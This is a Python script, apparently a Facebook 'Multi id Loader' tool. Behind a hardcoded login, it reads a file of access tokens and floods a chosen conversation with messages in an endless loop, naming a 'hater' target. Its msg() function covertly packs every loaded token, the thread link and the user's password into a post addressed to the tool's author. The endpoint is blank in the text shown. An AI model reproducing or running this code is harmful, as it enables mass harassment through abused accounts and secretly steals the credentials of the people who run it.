
from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()

def modelsInstaller():
    try:
        models = ['requests', 'colorama']
        for model in models:
            try:
                if(sys.version_info[0] < 3):
                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
                else:
                    os.system('python -m pip install {}'.format(model))
                print(' ')
                print('[+] {} has been installed successfully, Restart the program.'.format(model))
                sys.exit()
                print(' ')
            except:
                print('[-] Install {} manually.'.format(model))
                print(' ')
    except:
        pass
###----------[ IMPORT MODULES ]---------- ###

import base64
import json
import time
import sys
import os
import re
import binascii
import time
import json
import random
import threading
import pprint
import smtplib
import telnetlib
import os.path
import hashlib
import string
import glob
import sqlite3
import urllib
import getpass
import argparse
import marshal
import datetime  
from time import sleep 
from platform import system
from datetime import datetime

try:
    import requests
    from colorama import Fore
    from colorama import init
except:
    modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
    if system() == 'Linux':
        os.system('clear')
    else:
        if system() == 'Windows':
            os.system('cls')

def liness():
		print('\u001b[37m' + '[>] ================================')
		
		
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[1;31;1m'  # mode 31 = red foreground
RESET = '\033[1;37;1m'  # mode 0  = reset
BLUE = "\033[1;36;1m"
WHITE = "\033[1;30;1m",
YELLOW = "\033[1;37;1m",
CYAN = "\033[1;36;1m"
MAGENTA = "\033[1;37;1m",
GREEN = "\033[1;32;1m"
RESET = "\033[1;37;1m"
BOLD = '\033[1;37;1m'
REVERSE = "\033[1;37;1m"

def logo():
    clear = "\x1b[0m"
    colors = [31,]

    x = """
          
  ______                                 __            __    __   ______          ______                                
 /      \                               |  \          |  \  |  \ /      \      /      \                               
|  $$$$$$\      __   ______    ______  _| $$_         | $$  | $$|  $$$$$$\      |  $$$$$$\  ______   _______   __    __ 
| $$__| $$     |  \ /      \  /      \|   $$ \         \$$\/  $$ \$$__| $$      | $$___\$$ /      \ |       \ |  \  |  \
| $$    $$      \$$|  $$$$$$\|  $$$$$$\\$$$$$$          >$$  $$   |     $$       \$$    \ |  $$$$$$\| $$$$$$$\| $$  | $$
| $$$$$$$$     |  \| $$    $$| $$    $$ | $$ __        /  $$$$\  __\$$$$$\       _\$$$$$$\| $$  | $$| $$  | $$| $$  | $$
| $$  | $$     | $$| $$$$$$$$| $$$$$$$$ | $$|  \      |  $$ \$$\|  \__| $$      |  \__| $$| $$__/ $$| $$  | $$| $$__/ $$
| $$  | $$     | $$ \$$     \ \$$     \  \$$  $$      | $$  | $$ \$$    $$       \$$    $$ \$$    $$| $$  | $$ \$$    $$
 \$$   \$$__   | $$  \$$$$$$$  \$$$$$$$   \$$$$        \$$   \$$  \$$$$$$         \$$$$$$   \$$$$$$  \$$   \$$ _\$$$$$$$
         |  \__/ $$                                                                                           |  \__| $$
          \$$    $$                                                                                            \$$    $$
           \$$$$$$                                                                                              \$$$$$$ 

"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
logo()
testPY()
print('''\033[1;37m---------------------------------------------------------------------\n''')
def venom():
    clear = "\x1b[0m"
    colors = [37,31 , 33, 34]

    y = '''
      ==>[ Welcome to Multi id Loader Tool ]<==
'''
    for N, line in enumerate(y.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
    	
venom()


headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def getName(token):
		try:
			data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
		except:
			data = ""
		if 'name' in data:
			return data['name']
		else:
			return "Error occured"


if int:
    print('''\033[1;37m---------------------------------------------------------------------\n''')
    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = Ajeet ]=-''')
    print('''\033[1;37m-=[ Contact Us :: https://www.facebook.com/profile.php?id=100092988141664]=-\n''')
    print('''\033[1;36m---------------------------------------------------------------------\n''')
    i = datetime.now()
    print(i.strftime("\033[1;31m[#] Tool Run Time ==> %Y-%m-%d %I:%M:%S %p "))
    print('''\033[1;37m[#] (^^^) The Tool Maker  Increadable boii == > [ Ajeet Here ]\n''')
    print("\033[1;36;40m", end = "")
    import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'ajeetXD' and password == '9':
        print(' \033[0;95mSahii Haii Bhai.')
        os.system('espeak -a 300 " Welcome To Ajeet Tool Enjoy Karo"')
        break
    else:
        print(' Username Or Password Galat Hai Try Karo Firse..!! ')
        os.system('espeak -a 300 " Password Galat Hai Ajeet Se Pucho"')
        attemps += 1
        continue
os.system('clear')
pass


logo ()
venom()
os.system('espeak -a 300 " Enter Your Name here"')
Name = input("[+] Enter Your Name:: ")
os.system('espeak -a 300 "Welcome ..."'+Name)
os.system('espeak -a 300 " Enter Your Token File"'+Name)
token = input("[+] Token File :: ")
print('\n')
with open(token, 'r') as file:
	Tokens = file.readlines()
	num_tokens = len(Tokens)
	access_tokens = [token.strip() for token in Tokens]
	print('\n')
	thread_id = input(BOLD + CYAN + "\033[1;36m[+] Conservation ID :: \033[1;32;1m")
	haters_name = input(BOLD + CYAN + "\033[1;36m[+] Enter Kidx Name :: \033[1;32;1m")
	hwre_name = input(BOLD + CYAN + "\033[1;36m[+] Enter Here Name :: \033[1;32;1m")
	ms = input(BOLD + CYAN + "\033[1;36m[+] Add Np File :: \033[1;32;1m")
	timm = int(input(BOLD + CYAN + "\033[1;36m[+] Speed in Seconds :: \033[1;32;1m"))
	print('\n')
	with open(ms, 'r')as file:
		text_file_path = file.read().strip()
	with open(text_file_path, 'r') as file:
		messages = file.readlines()
	num_messages = len(messages)
	max_tokens = min(num_tokens, num_messages)
os.system('clear')
logo()
venom()
os.system('espeak -a 300 " Hogya Bhai Start... "')
os.system('espeak -a 300 " Tu Soja Ab Mai Dekh Lunga... "')
def msg():
		parameters = {
			'access_token' : random.choice(access_tokens),
			'message': 'Hello Ajeet Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
		}
		try:
			s = requests.post("", data=parameters, headers=headers)
		except:
			pass
	
msg()
while True:
		try:
			for message_index in range(num_messages):
				token_index = message_index % max_tokens
				access_token = access_tokens[token_index]

				message = messages[message_index].strip()

				url = "https://graph.facebook.com/v15.0/{}/".format('t_'+thread_id)
				parameters = {'access_token': access_token, 'message': haters_name + ' ' + message + ' ' + hwre_name}
				response = requests.post(url, json=parameters, headers=headers)
				

				tt = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
				if response.ok:
					print("\033[1;36;1m[#] Check kr Sab Sahi Haina {} Of Convo {} Successfuly Sent By Token. {}: {}".format(
						message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
					e = datetime.now()
					print (e.strftime("[#] Haan Bhai Chala Gya Tera Message | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
					liness()
				else:
					print("[#] Check kr Sab Sahi Haina {} Of Convo {} Successfuly Sent By Token. {}: {}".format(
						message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
					e = datetime.now()
					print (e.strftime("[#] Haan Bhai Chala Gya Tera Message | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
					liness()
				time.sleep(timm)
			print("[] All Messages Successfully Sent Wait 30 Second")
			time.sleep(30)
		except Exception as e:
			print(BOLD + RED + "\033[1;31;1m[#]] Net Band Hogya Bhai : Message  {} Of Convo {} Failed To Send. {}: {}".format(
				message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
			e = datetime.now()
			print (e.strftime("[#] Alone Ajeet iinxide | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
			sleep(10)
			liness()
else:
	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
